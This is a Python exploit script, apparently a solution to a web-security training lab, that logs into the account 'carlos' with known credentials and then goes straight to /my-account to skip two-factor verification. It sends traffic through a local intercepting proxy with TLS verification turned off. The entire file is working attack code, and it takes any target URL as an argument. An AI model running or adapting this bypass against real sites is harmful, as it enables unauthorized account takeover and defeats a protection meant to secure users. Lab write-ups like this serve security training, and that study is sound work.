import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}


def access_carlos_account(s, url):
    print("[*] Logging into Carlos's account and bypassing 2FA verification ...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    r = s.post(login_url, data=login_data,verify=False, proxies=proxy,allow_redirects=False)
    acc_url = url+"/my-account"
    r = s.get(acc_url, verify=False, proxies=proxy)
    if "Log out" in r.text:
        print("[*] Successfully logged in to Carlos's account")
    else:
        print ("[*] Exploit Failed :((")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("[*] Usage:  %s <url>" % sys.argv[0])
        print("[*] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    sessions = requests.Session()
    url = sys.argv[1]
    access_carlos_account(sessions, url)


if __name__ == "__main__":
    main()
